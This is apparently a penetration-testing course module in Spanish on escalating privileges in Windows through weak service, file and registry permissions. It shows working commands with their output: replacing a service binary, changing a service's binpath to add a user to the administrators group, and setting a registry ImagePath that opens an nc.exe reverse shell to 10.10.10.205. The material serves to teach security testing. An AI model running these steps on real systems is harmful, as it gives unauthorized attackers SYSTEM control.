Los permisos en los sistemas Windows son complicados y difíciles de manejar correctamente. Una ligera modificación en un lugar puede introducir un fallo en otro. Como penetration testers, necesitamos entender cómo funcionan los permisos en Windows y las diversas maneras en que las configuraciones incorrectas pueden ser aprovechadas para escalar privilegios. Los fallos relacionados con permisos discutidos en esta sección son relativamente poco comunes en aplicaciones de software producidas por grandes proveedores (pero se ven de vez en cuando), pero son comunes en software de terceros de proveedores más pequeños, software de código abierto y aplicaciones personalizadas. Los servicios suelen instalarse con privilegios de SYSTEM, por lo que aprovechar un fallo relacionado con los permisos de servicio puede llevar a un control total sobre el sistema objetivo. Independientemente del entorno, siempre debemos comprobar los permisos débiles y ser capaces de hacerlo tanto con la ayuda de herramientas como manualmente en caso de que nos encontremos en una situación donde no tengamos nuestras herramientas disponibles.

---

## Permissive File System ACLs

### Running SharpUp

Podemos usar [SharpUp](https://github.com/GhostPack/SharpUp/) de la suite de herramientas GhostPack para verificar binarios de servicio que sufren de ACLs débiles.

```r
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
  
```

La herramienta identifica el `PC Security Management Service`, que ejecuta el binario `SecurityService.exe` cuando se inicia.

### Checking Permissions with icacls

Usando [icacls](https://ss64.com/nt/icacls.html) podemos verificar la vulnerabilidad y ver que los grupos `EVERYONE` y `BUILTIN\Users` han recibido permisos completos para el directorio, por lo que cualquier usuario del sistema sin privilegios puede manipular el directorio y su contenido.

```r
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### Replacing Service Binary

Este servicio también puede ser iniciado por usuarios sin privilegios, por lo que podemos hacer una copia de seguridad del binario original y reemplazarlo con un binario malicioso generado con `msfvenom`. Esto puede darnos un reverse shell como `SYSTEM`, o agregar un usuario administrador local y darnos control administrativo total sobre la máquina.

```r
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

---

## Weak Service Permissions

### Reviewing SharpUp Again

Vamos a revisar de nuevo la salida de `SharpUp` en busca de servicios modificables. Vemos que el `WindscribeService` está potencialmente mal configurado.

```r
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Checking Permissions with AccessChk

A continuación, usaremos [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals para enumerar permisos en el servicio. Las banderas que usamos, en orden, son `-q` (omitir banner), `-u` (suprimir errores), `-v` (detallado), `-c` (especificar el nombre de un servicio de Windows) y `-w` (mostrar solo objetos que tienen acceso de escritura). Aquí podemos ver que todos los Authenticated Users tienen derechos de [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sobre el servicio, lo que significa control total de lectura/escritura sobre él.

```r
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

### Check Local Admin Group

Verificando el grupo de administradores locales confirmamos que nuestro usuario `htb-student` no es miembro.

```r
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

### Changing the Service Binary Path

Podemos usar nuestros permisos para cambiar la ruta del binario de manera maliciosa. Vamos a cambiarla para agregar nuestro usuario al grupo de administradores locales. Podríamos establecer la ruta del binario para ejecutar cualquier comando o ejecutable de nuestra elección (como un binario de reverse shell).

```r
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

### Stopping Service

A continuación, debemos detener el servicio para que el nuevo comando `binpath` se ejecute la próxima vez que se inicie.

```r
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

### Starting the Service

Como tenemos control total sobre el servicio, podemos iniciarlo nuevamente, y el comando que colocamos en el `binpath` se ejecutará incluso si se devuelve un mensaje de error. El servicio falla al iniciar porque el `binpath` no apunta al ejecutable real del servicio. Sin embargo, el ejecutable se ejecutará cuando el sistema intente iniciar el servicio antes de producir un error y detener el servicio nuevamente, ejecutando cualquier comando que especifiquemos en el `binpath`.

```r
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

### Confirming Local Admin Group Addition

Finalmente, verificamos que nuestro usuario fue agregado al grupo de administradores locales.

```r
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

Otro ejemplo notable es el Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), que es responsable de descargar e instalar actualizaciones del sistema operativo. Se considera un servicio esencial de Windows y no puede ser eliminado. Como es responsable de realizar cambios en el sistema operativo a través de la instalación de actualizaciones de seguridad y características, se ejecuta como la cuenta todopoderosa `NT AUTHORITY\SYSTEM`. Antes de instalar el parche de seguridad relacionado con [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), era posible elevar privilegios desde una cuenta de servicio a `SYSTEM`. Esto se debía a permisos débiles, que permitían a las cuentas de servicio modificar la ruta del binario del servicio y arrancar/detener el servicio.

---

## Weak Service Permissions - Cleanup

Podemos limpiar después de nosotros y asegurarnos de que el servicio esté funcionando correctamente deteniéndolo y restableciendo la ruta del binario al ejecutable original del servicio.

### Reverting the Binary Path

```r
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

### Starting the Service Again

Si todo sale según lo planeado, podemos iniciar el servicio nuevamente sin problema.

```r
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

### Verifying Service is Running

Consultar el servicio mostrará que está funcionando nuevamente como se pretende.

```r
C:\htb> sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
    
```

---

## Unquoted Service Path

Cuando se instala un servicio, la configuración del registro especifica una ruta al binario que debe ejecutarse al iniciar el servicio. Si este binario no está encapsulado entre comillas, Windows intentará localizar el binario en diferentes carpetas. Toma el siguiente ejemplo de ruta de binario.

### Service Binary Path

```r
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows decidirá el método de ejecución de un programa basado en su extensión de archivo, por lo que no es necesario especificarlo. Windows intentará cargar los siguientes ejecutables potenciales en orden al iniciar el servicio, con un .exe implícito:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

### Querying Service

```r
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Si podemos crear los siguientes archivos, podríamos secuestrar el binario del servicio y obtener ejecución de comandos en el contexto del servicio, en este caso, `NT AUTHORITY\SYSTEM`.

- `C:\Program.exe\`
- `C:\Program Files (x86)\System.exe`

Sin embargo, crear archivos en la raíz del disco o en la carpeta de archivos de programa requiere privilegios administrativos. Incluso si el sistema hubiera sido configurado incorrectamente para permitir esto, el usuario probablemente no podría reiniciar el servicio y dependería de un reinicio del sistema para escalar privilegios. Aunque no es raro encontrar aplicaciones con rutas de servicio sin comillas, no suele ser explotable.

### Searching for Unquoted Service Paths

Podemos identificar rutas de binarios de servicios sin comillas usando el siguiente comando.

```r
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

---

## Permissive Registry ACLs

También vale la pena buscar ACLs de servicios débiles en el registro de Windows. Podemos hacer esto usando `accesschk`.

### Checking for Weak Service ACLs in Registry

```r
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP> 
```

### Changing ImagePath with PowerShell

Podemos abusar de esto usando el cmdlet de PowerShell `Set-ItemProperty` para cambiar el valor de `ImagePath`, usando un comando como:

```r
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

---

## Modifiable Registry Autorun Binary

### Check Startup Programs

Podemos usar WMIC para ver qué programas se ejecutan al iniciar el sistema. Si tenemos permisos de escritura en el registro para un binario dado o podemos sobrescribir un binario listado, podríamos escalar privilegios a otro usuario la próxima vez que ese usuario inicie sesión.

```r
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

Este [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) y [este sitio](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detallan muchas ubicaciones potenciales de autorun en sistemas Windows.